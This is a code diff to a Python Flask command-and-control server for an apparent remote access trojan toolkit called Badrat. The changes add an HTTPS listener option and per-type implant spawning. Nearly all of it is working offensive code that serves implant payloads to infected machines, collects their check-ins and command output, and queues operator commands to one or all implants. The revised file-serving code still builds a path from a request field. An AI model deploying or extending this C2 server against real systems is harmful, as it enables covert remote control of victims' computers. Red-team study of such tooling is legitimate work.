@@ -2,6 +2,7 @@
 from flask import Flask, request
 from datetime import datetime
 import threading
+import argparse
 import readline
 import logging
 import base64
@@ -16,7 +17,13 @@ RED = '\033[91m'
 ENDC = '\033[0m'
 UNDERLINE = '\033[4m'
 
-port=8080
+parser = argparse.ArgumentParser()
+parser.add_argument("-p", "--port", help="Port to start the HTTP(S) server on", default=8080, action="store", dest="port")
+parser.add_argument("-s", "--ssl", help="Enable HTTPS listener instead of default HTTP", default=False, action="store_true", dest="ssl")
+args = parser.parse_args()
+port = args.port
+ssl = args.ssl
+
 supported_types = ["c", "py", "js", "ps1", "hta"]
 
 # I should probably make a dict of dicts...
@@ -40,8 +47,8 @@ def htmlify(data):
     html += "<body>\n"
     html += "<b>\n"
     html2 = "</b>\n"
-    html2 = "</body>\n"
-    html2 = "</html>\n"
+    html2 += "</body>\n"
+    html2 += "</html>\n"
     return(html + data + "\n" + html2)
 
 # Print colors according to the rat type
@@ -63,6 +70,8 @@ def colors(value):
         return( BOLD + c + ">" + js + ">" + ENDC)
     elif(value == "commit Seppuku"):
         return(c + value + ENDC)
+    elif(value == "HTTP" or value == "HTTPS"):
+        return(BOLD + value + ENDC)
     try:
         checkin = datetime.strptime(value, "%H:%M:%S")
         delta_seconds = (datetime.now() - checkin).seconds
@@ -82,14 +91,16 @@ def default_page():
 
 # Allow rats to call home and request more ratcode of their own type
 def send_ratcode(ratID="", ratType=""):
-    if(ratID):
-        # Careful for path traversal vuln... This code may not be 100 percent safe
-        with open(os.getcwd() + "/rats/badrat." + types[ratID], 'r') as fd:
-            print("\n[*] sending ratcode to " + colors(ratID))
+    if(ratType):
+        with open(os.getcwd() + "/rats/badrat." + ratType, 'r') as fd:
+            if(ratID):
+                print("\n[*] sending " + colors(ratType) + " ratcode to " + colors(ratID))
+            else:
+                print("\n[*] sending ratcode to " + colors(ratType) + " rat")
             return(fd.read())
-    elif(ratType == "hta"):
-        with open(os.getcwd() + "/rats/badrat.hta", 'r') as fd:
-            print("\n[*] sending ratcode to " + colors("hta") + " rat")
+    elif(ratID):
+        with open(os.getcwd() + "/rats/badrat." + types[ratID], 'r') as fd:
+            print("\n[*] sending " + colors(types[ratID]) + " ratcode to " + colors(ratID))
             return(fd.read())
 
 def serve_server(port=8080):
@@ -123,7 +134,7 @@ def serve_server(port=8080):
                 ratType = "?"
             username = str(post_dict['un'])
         except:
-            print("[!] Failed to grab id, type, or user param from POST request")
+            print("\n[!] Failed to grab id, type, or user param from POST request")
             return(default_page())
 
         # Update checkin time for an agent every checkin
@@ -135,19 +146,27 @@ def serve_server(port=8080):
         # If there is no current command for a rat, create a blank one
         if(ratID not in commands):
             commands[ratID] = ""
+            print("\n[*] New rat checked in: " + colors(ratID))
 
         if("retval" in post_dict.keys()):
             commands[ratID] = ""
-            print("\nResults from rat " + colors(str(post_dict['id'])) + "\n")
+            print("\n[*] Results from rat " + colors(str(post_dict['id'])) + "\n")
             print(base64.b64decode(post_dict['retval']).decode('utf-8'))
 
         # Spawn from HTTP page
-        if("req" in post_dict.keys() and post_dict['req'] == "spawn"):
-            return(send_ratcode(ratID=ratID))
+        if("req" in post_dict.keys() and str.startswith(post_dict['req'], "spawn ")):
+            spawnType =  post_dict['req'].split(" ")[1]
+            return(send_ratcode(ratID=ratID,ratType=spawnType))
 
         return(htmlify(json.dumps({"cmnd": commands[ratID]})))
 
-    app.run(host="0.0.0.0", port=port)
+    # Run the listener. Choose between HTTP and HTTPS based on if --ssl was specfied
+    if(ssl):
+        print("[*] Starting " + colors("HTTPS") + " listener on port " + str(port) + "\n\n")
+        app.run(host="0.0.0.0", port=port, ssl_context=("cert/cert.pem", "cert/privkey.pem"))
+    else:
+        print("[*] Starting " + colors("HTTP") + " listener on port " + str(port) + "\n\n")
+        app.run(host="0.0.0.0", port=port)
 
 def get_rats(current=""):
     print("\n    implant id \ttype\tcheck-in\tusername")
@@ -199,69 +218,67 @@ def get_help():
     print("The server is written in python and uses an HTTP listener for C2 comms")
     print("Rats are SINGLE THREADED, which means long running commands will lock up the rat. Try spawning a new rat before running risky commands")
     print("Some rats need to write to disk for execution or cmd output. Every rat that must write to disk cleans up files created.")
-    print("Rat communications are NOT SECURE. Do not send sensitive info through the C2 channel")
-    print("Rats are designed to use methods native to their type as much as
-        possible. E.g.: HTA rat will never use Powershell.exe, and the
-        Powershell rat will never use cmd.exe\n")
+    print("By default, rat communications are NOT SECURE. Do not send sensitive info through the C2 channel unless using SSL")
+    print("Rats are designed to use methods native to their type as much as possible. E.g.: HTA rat will never use Powershell.exe, and the Powershell rat will never use cmd.exe\n")
 
 if __name__ == "__main__":
     # Start the Flask server
-    print("[*] Starting HTTP listener on port " + str(port) + "\n\n")
     server = threading.Thread(target=serve_server, kwargs=dict(port=port), daemon=True)
     server.start()
     time.sleep(0.5)
     if not server.is_alive():
-        print("[!] Could not start listener!")
+        print("\n[!] Could not start listener!")
         sys.exit()
 
-# Main menu
-while True:
-    inp = input(UNDERLINE + "Badrat" + ENDC + " //> ")
+    # Main menu
+    while True:
+        inp = input(UNDERLINE + "Badrat" + ENDC + " //> ")
 
-    # Check if the operator wants to quit badrat
-    if(inp == "exit"):
-        sys.exit()
+        # Check if the operator wants to quit badrat
+        if(inp == "exit"):
+            print("[*] Shutting down badrat listener")
+            sys.exit()
 
-    # Gets the help info
-    elif(inp == "help"):
-        get_help()
+        # Gets the help info
+        elif(inp == "help"):
+            get_help()
 
-    # View rats, their types, and their latest checkin times
-    elif(inp == "agents" or inp == "rats" or inp == "sessions"):
-        get_rats()
+        # View rats, their types, and their latest checkin times
+        elif(inp == "agents" or inp == "rats" or inp == "sessions"):
+            get_rats()
 
-    # Remove rats -- either by ratID or all
-    elif(str.startswith(inp, "remove")):
-        if(str.startswith(inp, "all", 6, 3)):
-            remove_rat("all")
-        else:
-            remove_rat(inp.split(" ")[1])
+        # Remove rats -- either by ratID or all
+        elif(str.startswith(inp, "remove")):
+            if(str.startswith(inp, "all", 6, 3)):
+                remove_rat("all")
+            else:
+                remove_rat(inp.split(" ")[1])
 
-    # Clear the screen
-    elif(inp == "clear"):
-        os.system("clear")
+        # Clear the screen
+        elif(inp == "clear"):
+            os.system("clear")
 
-    # Enter rat specific command prompt
-    elif(inp in rats.keys() or inp == "all"):
-        ratID = inp
-        while True:
-            inp = input(colors(ratID) + " \\\\> ")
-            if(inp == "back" or inp == "exit"):
-                break
-            elif(inp == "agents" or inp == "rats" or inp == "checkins" or inp == "sessions"):
-                get_rats(ratID)
-            elif(inp == "clear"):
-                os.system("clear")
-            elif(inp):
-                if(inp == "quit" or inp == "kill_rat"):
-                    print("[*] Tasked " + colors(ratID) + " to " + colors("commit Seppuku"))
-                    inp = "quit"
-                else:
-                    print("[*] Queued command " + colors(inp) + " for " + colors(ratID))
+        # Enter rat specific command prompt
+        elif(inp in rats.keys() or inp == "all"):
+            ratID = inp
+            while True:
+                inp = input(colors(ratID) + " \\\\> ")
+                if(inp == "back" or inp == "exit"):
+                    break
+                elif(inp == "agents" or inp == "rats" or inp == "checkins" or inp == "sessions"):
+                    get_rats(ratID)
+                elif(inp == "clear"):
+                    os.system("clear")
+                elif(inp):
+                    if(inp == "quit" or inp == "kill_rat"):
+                        print("[*] Tasked " + colors(ratID) + " to " + colors("commit Seppuku"))
+                        inp = "quit"
+                    else:
+                        print("[*] Queued command " + colors(inp) + " for " + colors(ratID))
 
-                if(ratID == "all"):
-                    # update ALL commands
-                    for i in commands.keys():
-                        commands[i] = inp
-                else:
-                    commands[ratID] = inp
+                    if(ratID == "all"):
+                        # update ALL commands
+                        for i in commands.keys():
+                            commands[i] = inp
+                    else:
+                        commands[ratID] = inp
